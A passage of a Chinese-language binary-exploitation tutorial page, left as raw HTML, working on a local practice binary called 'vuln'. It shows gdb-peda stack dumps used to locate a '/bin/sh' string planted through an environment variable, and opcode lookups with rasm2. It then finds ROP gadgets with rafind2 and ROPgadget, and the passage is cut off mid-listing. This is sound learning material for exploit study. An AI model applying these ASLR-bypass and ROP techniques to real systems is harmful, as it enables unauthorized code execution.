(\"DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path\")</span><br><span class=\"line\">0440| 0x7fffffffdec0 --&gt; 0x7fffffffea4c (\"PWD=/home/tianji/Desktop/sploit/bypassaslr_1\")</span><br><span class=\"line\">0448| 0x7fffffffdec8 --&gt; 0x7fffffffea79 (\"LINES=24\")</span><br><span class=\"line\">0456| 0x7fffffffded0 --&gt; 0x7fffffffea82 (\"HOME=/home/tianji\")</span><br><span class=\"line\">0464| 0x7fffffffded8 --&gt; 0x7fffffffea94 (\"TEXTDOMAIN=im-config\")</span><br><span class=\"line\">0472| 0x7fffffffdee0 --&gt; 0x7fffffffeaa9 (\"SSH_AGENT_PID=1606\")</span><br><span class=\"line\">0480| 0x7fffffffdee8 --&gt; 0x7fffffffeabc (\"QT_ACCESSIBILITY=1\")</span><br><span class=\"line\">0488| 0x7fffffffdef0 --&gt; 0x7fffffffeacf (\"XDG_SESSION_TYPE=x11\")</span><br><span class=\"line\">0496| 0x7fffffffdef8 --&gt; 0x7fffffffeae4 (\"XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop\")</span><br><span class=\"line\">0504| 0x7fffffffdf00 --&gt; 0x7fffffffeb37 (\"XDG_SESSION_DESKTOP=ubuntu\")</span><br><span class=\"line\">0512| 0x7fffffffdf08 --&gt; 0x7fffffffeb52 (\"LC_ADDRESS=zh_CN.UTF-8\")</span><br><span class=\"line\">0520| 0x7fffffffdf10 --&gt; 0x7fffffffeb69 (\"GJS_DEBUG_OUTPUT=stderr\")</span><br><span class=\"line\">0528| 0x7fffffffdf18 --&gt; 0x7fffffffeb81 (\"LC_NUMERIC=zh_CN.UTF-8\")</span><br><span class=\"line\">0536| 0x7fffffffdf20 --&gt; 0x7fffffffeb98 (\"ALL_PROXY=socks://127.0.0.1:1080/\")</span><br><span class=\"line\">0544| 0x7fffffffdf28 --&gt; 0x7fffffffebba (\"no_proxy=localhost,127.0.0.0/8,::1\")</span><br><span class=\"line\">0552| 0x7fffffffdf30 --&gt; 0x7fffffffebdd (\"GTK_MODULES=gail:atk-bridge\")</span><br><span class=\"line\">0560| 0x7fffffffdf38 --&gt; 0x7fffffffebf9 (\"NO_PROXY=localhost,127.0.0.0/8,::1\")</span><br><span class=\"line\">0568| 0x7fffffffdf40 --&gt; 0x7fffffffec1c (\"COLUMNS=79\")</span><br><span class=\"line\">0576| 0x7fffffffdf48 --&gt; 0x7fffffffec27 (\"WINDOWPATH=1\")</span><br><span class=\"line\">0584| 0x7fffffffdf50 --&gt; 0x7fffffffec34 (\"SHELL=/bin/bash\")</span><br><span class=\"line\">0592| 0x7fffffffdf58 --&gt; 0x7fffffffec44 (\"VTE_VERSION=5201\")</span><br></pre></td></tr></table></figure>\n<p>我们可以看到“SHELL=/bin/bash”的地址:<code>0x7fffffffec34</code>,然后去掉<code>SHELL</code>,这样“/bin/bash”的地址就是<code>0x7fffffffec3a</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ x/s 0x7fffffffec3a</span><br><span class=\"line\">0x7fffffffec3a:\t&quot;/bin/bash&quot;</span><br></pre></td></tr></table></figure>\n<p>当然，我这里是”/bin/bash”,所以这方法不可行。这时候，可以添加环境变量。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ export ABC=/bin/sh</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln</span><br><span class=\"line\">Catchpoint 1 (exec)</span><br><span class=\"line\">Reading symbols from vuln...done.</span><br><span class=\"line\">gdb-peda$ b *main</span><br><span class=\"line\">Breakpoint 2 at 0x739: file vuln.c, line 17.</span><br><span class=\"line\">gdb-peda$ r</span><br><span class=\"line\">Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln </span><br><span class=\"line\"></span><br><span class=\"line\">[----------------------------------registers-----------------------------------]</span><br><span class=\"line\">RAX: 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">RBX: 0x0 </span><br><span class=\"line\">RCX: 0x555555554790 (&lt;__libc_csu_init&gt;:\tpush   r15)</span><br><span class=\"line\">RDX: 0x7fffffffdde8 --&gt; 0x7fffffffe1bb (&quot;CLUTTER_IM_MODULE=xim&quot;)</span><br><span class=\"line\">RSI: 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class=\"line\">RDI: 0x1 </span><br><span class=\"line\">RBP: 0x555555554790 (&lt;__libc_csu_init&gt;:\tpush   r15)</span><br><span class=\"line\">RSP: 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">RIP: 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class=\"line\">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class=\"line\">R10: 0x0 </span><br><span class=\"line\">R11: 0x1 </span><br><span class=\"line\">R12: 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">R13: 0x7fffffffddd0 --&gt; 0x1 </span><br><span class=\"line\">R14: 0x0 </span><br><span class=\"line\">R15: 0x0</span><br><span class=\"line\">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class=\"line\">[-------------------------------------code-------------------------------------]</span><br><span class=\"line\">   0x55555555472a &lt;shell+16&gt;:\tcall   0x5555555545d0 &lt;system@plt&gt;</span><br><span class=\"line\">   0x55555555472f &lt;shell+21&gt;:\tmov    edi,0x0</span><br><span class=\"line\">   0x555555554734 &lt;shell+26&gt;:\tcall   0x5555555545f0 &lt;exit@plt&gt;</span><br><span class=\"line\">=&gt; 0x555555554739 &lt;main&gt;:\tpush   rbp</span><br><span class=\"line\">   0x55555555473a &lt;main+1&gt;:\tmov    rbp,rsp</span><br><span class=\"line\">   0x55555555473d &lt;main+4&gt;:\tsub    rsp,0x120</span><br><span class=\"line\">   0x555555554744 &lt;main+11&gt;:\tmov    DWORD PTR [rbp-0x114],edi</span><br><span class=\"line\">   0x55555555474a &lt;main+17&gt;:\tmov    QWORD PTR [rbp-0x120],rsi</span><br><span class=\"line\">[------------------------------------stack-------------------------------------]</span><br><span class=\"line\">0000| 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">0008| 0x7fffffffdd00 --&gt; 0x1 </span><br><span class=\"line\">0016| 0x7fffffffdd08 --&gt; 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class=\"line\">0024| 0x7fffffffdd10 --&gt; 0x100008000 </span><br><span class=\"line\">0032| 0x7fffffffdd18 --&gt; 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">0040| 0x7fffffffdd20 --&gt; 0x0 </span><br><span class=\"line\">0048| 0x7fffffffdd28 --&gt; 0x6b6b7edd8dce246d </span><br><span class=\"line\">0056| 0x7fffffffdd30 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">[------------------------------------------------------------------------------]</span><br><span class=\"line\">Legend: code, data, rodata, value</span><br><span class=\"line\"></span><br><span class=\"line\">Breakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17</span><br><span class=\"line\">warning: Source file is more recent than executable.</span><br><span class=\"line\">17\tint main(int argc, char* argv[]) &#123;</span><br><span class=\"line\">gdb-peda$ telescope 200</span><br><span class=\"line\">0000| 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">0008| 0x7fffffffdd00 --&gt; 0x1 </span><br><span class=\"line\">0016| 0x7fffffffdd08 --&gt; 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class=\"line\">0024| 0x7fffffffdd10 --&gt; 0x100008000 </span><br><span class=\"line\">0032| 0x7fffffffdd18 --&gt; 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">0040| 0x7fffffffdd20 --&gt; 0x0 </span><br><span class=\"line\">0048| 0x7fffffffdd28 --&gt; 0x6b6b7edd8dce246d </span><br><span class=\"line\">0056| 0x7fffffffdd30 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">0064| 0x7fffffffdd38 --&gt; 0x7fffffffddd0 --&gt; 0x1 </span><br><span class=\"line\">0072| 0x7fffffffdd40 --&gt; 0x0 </span><br><span class=\"line\">0080| 0x7fffffffdd48 --&gt; 0x0 </span><br><span class=\"line\">0088| 0x7fffffffdd50 --&gt; 0x3e3e2b88b8ee246d </span><br><span class=\"line\">0096| 0x7fffffffdd58 --&gt; 0x3e3e3b37b470246d </span><br><span class=\"line\">0104| 0x7fffffffdd60 --&gt; 0x7fff00000000 </span><br><span class=\"line\">0112| 0x7fffffffdd68 --&gt; 0x0 </span><br><span class=\"line\">0120| 0x7fffffffdd70 --&gt; 0x0 </span><br><span class=\"line\">0128| 0x7fffffffdd78 --&gt; 0x7ffff7de5733 (&lt;_dl_init+259&gt;:\tadd    r14,0x8)</span><br><span class=\"line\">0136| 0x7fffffffdd80 --&gt; 0x7ffff7dcb638 --&gt; 0x7ffff7b7de10 --&gt; 0x8348535554415541 </span><br><span class=\"line\">0144| 0x7fffffffdd88 --&gt; 0x22bf66c6 </span><br><span class=\"line\">0152| 0x7fffffffdd90 --&gt; 0x0 </span><br><span class=\"line\">0160| 0x7fffffffdd98 --&gt; 0x0 </span><br><span class=\"line\">0168| 0x7fffffffdda0 --&gt; 0x0 </span><br><span class=\"line\">0176| 0x7fffffffdda8 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">0184| 0x7fffffffddb0 --&gt; 0x7fffffffddd0 --&gt; 0x1 </span><br><span class=\"line\">0192| 0x7fffffffddb8 --&gt; 0x55555555463a (&lt;_start+42&gt;:\thlt)</span><br><span class=\"line\">--More--(25/200)</span><br><span class=\"line\">0200| 0x7fffffffddc0 --&gt; 0x7fffffffddc8 --&gt; 0x1c </span><br><span class=\"line\">0208| 0x7fffffffddc8 --&gt; 0x1c </span><br><span class=\"line\">0216| 0x7fffffffddd0 --&gt; 0x1 </span><br><span class=\"line\">0224| 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class=\"line\">0232| 0x7fffffffdde0 --&gt; 0x0 </span><br><span class=\"line\">0240| 0x7fffffffdde8 --&gt; 0x7fffffffe1bb (&quot;CLUTTER_IM_MODULE=xim&quot;)</span><br><span class=\"line\">0248| 0x7fffffffddf0 --&gt; 0x7fffffffe1d1 (&quot;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc&quot;...)</span><br><span class=\"line\">0256| 0x7fffffffddf8 --&gt; 0x7fffffffe7bd (&quot;LC_MEASUREMENT=zh_CN.UTF-8&quot;)</span><br><span class=\"line\">0264| 0x7fffffffde00 --&gt; 0x7fffffffe7d8 (&quot;LESSCLOSE=/usr/bin/lesspipe %s %s&quot;)</span><br><span class=\"line\">0272| 0x7fffffffde08 --&gt; 0x7fffffffe7fa (&quot;LC_PAPER=zh_CN.UTF-8&quot;)</span><br><span class=\"line\">0280| 0x7fffffffde10 --&gt; 0x7fffffffe80f (&quot;LC_MONETARY=zh_CN.UTF-8&quot;)</span><br><span class=\"line\">0288| 0x7fffffffde18 --&gt; 0x7fffffffe827 (&quot;XDG_MENU_PREFIX=gnome-&quot;)</span><br><span class=\"line\">0296| 0x7fffffffde20 --&gt; 0x7fffffffe83e (&quot;_=/usr/bin/gdb&quot;)</span><br><span class=\"line\">0304| 0x7fffffffde28 --&gt; 0x7fffffffe84d (&quot;LANG=en_US.UTF-8&quot;)</span><br><span class=\"line\">0312| 0x7fffffffde30 --&gt; 0x7fffffffe85e (&quot;DISPLAY=:0&quot;)</span><br><span class=\"line\">0320| 0x7fffffffde38 --&gt; 0x7fffffffe869 (&quot;ABC=/bin/sh&quot;)</span><br><span class=\"line\">0328| 0x7fffffffde40 --&gt; 0x7fffffffe875 (&quot;OLDPWD=/home/tianji/Desktop/sploit&quot;)</span><br><span class=\"line\">0336| 0x7fffffffde48 --&gt; 0x7fffffffe898 (&quot;GNOME_SHELL_SESSION_MODE=ubuntu&quot;)</span><br><span class=\"line\">0344| 0x7fffffffde50 --&gt; 0x7fffffffe8b8 (&quot;COLORTERM=truecolor&quot;)</span><br><span class=\"line\">0352| 0x7fffffffde58 --&gt; 0x7fffffffe8cc (&quot;USERNAME=tianji&quot;)</span><br><span class=\"line\">0360| 0x7fffffffde60 --&gt; 0x7fffffffe8dc (&quot;XDG_VTNR=1&quot;)</span><br><span class=\"line\">0368| 0x7fffffffde68 --&gt; 0x7fffffffe8e7 (&quot;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&quot;)</span><br><span class=\"line\">0376| 0x7fffffffde70 --&gt; 0x7fffffffe910 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)</span><br><span class=\"line\">0384| 0x7fffffffde78 --&gt; 0x7fffffffe946 (&quot;LC_NAME=zh_CN.UTF-8&quot;)</span><br><span class=\"line\">0392| 0x7fffffffde80 --&gt; 0x7fffffffe95a (&quot;XDG_SESSION_ID=1&quot;)</span><br></pre></td></tr></table></figure>\n<p>可以看到”/bin/sh”的地址：<code>0x7fffffffe869 + 0x6 = 0x7fffffffe86e</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ x/s 0x7fffffffe86e</span><br><span class=\"line\">0x7fffffffe86e:\t&quot;bin/sh&quot;</span><br></pre></td></tr></table></figure>\n<p>当然，这个方法仅限本地使用。</p>\n<h2 id=\"反汇编代码\"><a href=\"#反汇编代码\" class=\"headerlink\" title=\"反汇编代码\"></a>反汇编代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 &quot;jmp rsp&quot;</span><br><span class=\"line\">ffe4</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 &quot;pop rdi; ret&quot;</span><br><span class=\"line\">5fc3</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/heap/unlink$ disasm &quot;5fc3&quot;</span><br><span class=\"line\">   0:    5f                       pop    edi</span><br><span class=\"line\">   1:    c3                       ret</span><br></pre></td></tr></table></figure>\n<h2 id=\"在可执行文件中找gadget\"><a href=\"#在可执行文件中找gadget\" class=\"headerlink\" title=\"在可执行文件中找gadget\"></a>在可执行文件中找gadget</h2><p>方法一:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -x 5fc3 -X vuln</span><br><span class=\"line\">0x7f3</span><br><span class=\"line\">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class=\"line\">0x000007f3  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............</span><br><span class=\"line\">0x00000803  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........</span><br><span class=\"line\">0x00000813  002f 6269 6e2f 7368 0001 1b03 3b40 0000  ./bin/sh....;@..</span><br><span class=\"line\">0x00000823  0007 0000 0094 fdff ff8c 0000 00e4 fdff  ................</span><br><span class=\"line\">0x00000833  ffb4 0000 00f4 fdff ff5c 0000 00fe       .........\\....</span><br></pre></td></tr></table></figure>\n<p>可以看到5fc3的偏移位置就是: ‘0x7f3’</p>\n<p>方法二:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x0000000000000707 : add bl, dh ; ret</span><br><span class=\"line\">0x00000000000007ff : add bl, dh ; ret</span><br><span class=\"line\">0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class=\"line\">0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class=\"line\">0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class=\"line\">0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class=\"line\">0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class=\"line\">0x0000000000000788 : add byte ptr [rax], al ; leave ; ret</span><br><span class=\"line\">0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000000706 : add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x00000000000007fe : add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000000789 : add cl, cl ; ret</span><br><span class=\"line\">0x00000000000005a3 : add esp, 8 ; ret</span><br><span class=\"line\">0x0000000000000809 : add esp, 8 ; ret</span><br><span class=\"line\">0x00000000000005a2 : add rsp, 8 ; ret</span><br><span class=\"line\">0x0000000000000808 : add rsp, 8 ; ret</span><br><span class=\"line\">0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax</span><br><span class=\"line\">0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000007d9 : call qword ptr [r12 + rbx*8]</span><br><span class=\"line\">0x00000000000007da : call qword ptr [rsp + rbx*8]</span><br><span class=\"line\">0x00000000000005a0 : call rax</span><br><span class=\"line\">0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret</span><br><span class=\"line\">0x000000000000059e : je 0x5a4 ; call rax</span><br><span class=\"line\">0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x0000000000000664 : jmp rax</span><br><span class=\"line\">0x00000000000006b5 : jmp rax</span><br><span class=\"line\">0x000000000000078a : leave ; ret</span><br><span class=\"line\">0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000000785 : mov eax, 0 ; leave ; ret</span><br><span class=\"line\">0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]</span><br><span class=\"line\">0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]</span><br><span class=\"line\">0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000007f8 : nop dword ptr [rax + rax] ; ret</span><br><span class=\"line\">0x0000000000000701 : nop dword ptr [rax] ; ret</span><br><span class=\"line\">0x00000000000006b3 : or al, 0x5d ; jmp rax</span><br><span class=\"line\">0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]</span><br><span class=\"line\">0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000007f0 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000007f2 : pop r15 ; ret</span><br><span class=\"line\">0x0000000000000663 : pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000006b4 : pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000000670 : pop rbp ; ret</span><br><span class=\"line\">0x00000000000006c0 : pop rbp ; ret</span><br><span class=\"line\">0x00000000000006ff : pop rbp ; ret</span><br><span class=\"line\">0x00000000000007f3 : pop rdi ; ret</span><br><span class=\"line\">0x00000000000007f1 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000005a6 : ret</span><br><span class=\"line\">0x0000000000000671 : ret</span><br><span class=\"line\">0x00000000000006c1 : ret</span><br><span class=\"line\">0x0000000000000700 : ret</span><br><span class=\"line\">0x0000000000000709 : ret</span><br><span class=\"line\">0x0000000000000708 : ret</span><br><span class=\"line\">0x000000000000078b : ret</span><br><span class=\"line\">0x00000000000007df : ret</span><br><span class=\"line\">0x00000000000007f4 : ret</span><br><span class=\"line\">0x0000000000000801 : ret</span><br><span class=\"line\">0x0000000000000800 : ret</span><br><span class=\"line\">0x000000000000080c : ret</span><br><span class=\"line\">0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret</span><br><span class=\"line\">0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret</span><br><span class=\"line\">0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret</span><br><span class=\"line\">0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax</span><br><span class=\"line\">0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax</span><br><span 